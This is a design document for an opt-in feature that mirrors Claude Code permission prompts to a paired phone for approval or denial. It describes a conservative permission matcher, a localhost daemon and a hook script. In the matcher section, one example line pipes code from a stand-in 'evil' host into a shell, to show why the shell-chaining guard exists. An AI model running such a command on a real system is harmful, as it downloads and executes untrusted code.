# Remote approval (opt-in) — design

**Date:** 2026-06-04
**Status:** Approved for implementation
**Feature:** Approve/deny a Claude Code tool use from the paired phone, but only
when the Mac would genuinely prompt for it.

## Goal

Let a user approve or deny a command from their phone **exactly when Claude Code
would otherwise prompt them on the Mac** — i.e. for a tool use that is *not*
auto-allowed by their permission rules. Allow-listed commands run silently and
the phone stays a read-only dashboard.

## Why opt-in

The developer's own Mac runs `defaultMode: auto` (everything auto-runs, no
prompt). For that machine there is nothing to mirror, and a gate would only add
latency. But other users run Claude Code in a prompting mode, where this feature
is exactly right. So it ships **disabled by default** and is enabled per machine
via an install flag. The default install remains status-only and unchanged.

## The mode-agnostic insight

One hook serves every permission mode because **on timeout / unreachable the hook
returns nothing and lets Claude fall back to its own behaviour**:

- prompting-mode user → Claude shows its normal **terminal** prompt (safe fallback);
- auto-mode user → Claude **auto-runs** (their status quo).

The hook never needs to know the user's mode. We only ever *add* an approval
opportunity; any failure degrades to Claude's normal behaviour.

## Components

### 1. Wire model (`VibeBuddyKit`)
`AgentSession.pendingApproval: PendingApproval?` where
`PendingApproval = { id: String, tool: String, commandPreview: String }`.
Codable, optional, additive (older clients ignore it). When present, the row
shows approve/deny and the session reads as "needs you".

### 2. Permission matcher (`VibeBuddyMacCore`, TDD-critical)
Pure function: `match(tool:input:allow:deny:) -> Decision { allow, deny, ask }`.

- Matches any `deny` rule → `.deny`.
- Else matches any `allow` rule → `.allow`.
- Else → `.ask`. **Conservative: when unsure, `.ask`** (over-asking is safe;
  under-asking is the only dangerous direction).

Rule format mirrors Claude Code: `Tool(arg)` e.g. `Bash(git worktree:*)`,
`Read(//abs/**)`, `Write(./rel/**)`; a bare `Tool` matches the whole tool.

**Bash shell-chaining guard (the safety crux):** a Bash command containing any of
`&&  ||  |  ;  $(  ` `` ` ``  )  >  <  &` or a newline is **never** `.allow`
(forced to `.ask`), even if its prefix matches an allow rule. This neutralises
`Bash(git worktree:*)` + `git worktree list && curl evil | sh`: the prefix
matches but `&&` forces a real approval.

- `Bash(prefix:*)` → command must *start with* `prefix` (token-aware) **and** pass
  the chaining guard.
- `Bash(exact)` (no `:*`) → exact-string match.
- Path tools (`Read`/`Write`/`Edit`) → gitignore-style glob of the rule arg
  against the input's file path.

Rules source for v1: the user-level `~/.claude/settings.json`
`permissions.allow` / `permissions.deny`. (See Non-goals for project-level
merging — its absence only makes us over-ask, which is safe.)

### 3. Daemon (`VibeBuddyMacCore`)
- **Pending-approvals registry** (actor): `approvalId -> continuation`, plus a
  timeout task per entry.
- **`POST /approval`** (localhost, no token — like `/hook`). Body is the
  `PreToolUse` JSON. Parse → run the matcher:
  - `.allow` → apply as a normal PreToolUse (status → working) and respond with
    `permissionDecision: "allow"`.
  - `.deny`  → respond `permissionDecision: "deny"`.
  - `.ask`   → set the session's `pendingApproval` + status `needsResponse`
    (`waitKind: .permission`), broadcast, and **hold** the request (await the
    continuation) until a decision or ~25s. On approve → status back to working,
    respond `allow`. On deny → respond `deny`. On timeout → clear
    `pendingApproval`, broadcast, respond **empty** (the hook prints nothing).
- **`POST /decision`** (token-gated, from the phone): `{ approvalId, decision }`
  → resolve the matching continuation, clear `pendingApproval`, broadcast.
  Unknown / expired `approvalId` → ignored (idempotent).

With `--approval` enabled the installer points **PreToolUse at `/approval`
instead of `/hook`**, so the working-status update and the approval check are one
call — no double-fire race between "working" and "pendingApproval". All other
events (PostToolUse, Notification, Stop, SessionEnd, …) still go to `/hook`.

### 4. Blocking hook script (`hooks/`)
A dumb forwarder, installed only with `--approval`:
```sh
RESP=$(curl -sS --max-time 30 -X POST --data-binary @- http://127.0.0.1:${PORT}/approval 2>/dev/null)
[ -n "$RESP" ] && printf '%s' "$RESP"   # else print nothing → Claude proceeds normally
exit 0                                   # never break Claude
```
`max-time 30` sits under Claude's 60s hook timeout so *we* own the fallback. Any
failure → empty stdout → Claude's normal flow.

### 5. iOS (`VibeBuddyApp`)
- `SessionRow`: when `pendingApproval != nil`, surface the command preview and
  批准 / 拒绝 buttons.
- `DecisionClient`: `POST /decision` to `host:port` with the pairing Bearer
  token; `DashboardStore.decide(approvalId:approve:)` wires the buttons.

## Data flow (happy path + fallbacks)
1. Non-allow Bash → blocking hook → `POST /approval`.
2. Matcher → `.ask` → daemon sets `pendingApproval`, broadcasts; phone buzzes and
   shows the command.
3. Tap 批准 → `POST /decision{allow}` → daemon resolves the held request → hook
   prints `allow` → Claude runs the command.
   - Tap 拒绝 → `deny` → Claude blocks it.
   - No answer in 25s → daemon responds empty → hook prints nothing → Claude's
     own mode decides (terminal prompt for prompting-mode, auto-run for auto-mode).

## Safety
- Never silently allow a composed Bash command (chaining guard).
- Worst case is Claude's normal behaviour — the feature only *adds* an approval
  opportunity and defers on any failure.
- `/decision` is token-gated; `approvalId` is a random UUID (unguessable),
  `/approval` is localhost-only.

## Testability (honest)
- **Unit (TDD):** the matcher + chaining guard (many cases), the pending registry
  resolve/timeout, `/approval` and `/decision` in-process.
- **Live, locally possible:** enable the opt-in hook on the auto-mode dev Mac, run
  a non-allow command, approve on the phone before 25s → it runs.
- **Not locally testable:** the "timeout → terminal prompt" fallback, because the
  dev Mac auto-runs on timeout instead of prompting. That path is covered by
  reasoning + unit tests, not a local end-to-end. Flagged, not hidden.

## Non-goals (v1)
- "Always allow" / writeback to `settings.json`.
- Project-level / `.local` settings merging (user-level allow/deny only; missing
  project rules only cause safe over-asking).
- Replicating `ask`-list / `defaultMode` / `bypassPermissions` precedence.
- Codex (its `notify` cannot block a tool use).

## Defaults (adjustable)
- Hook wait ~25s (under Claude's 60s hook timeout).
- Approve-once only.
- Phone shows tool + truncated command / file path.
- Opt-in: `install-claude-hooks.py --approval` (default install unchanged).
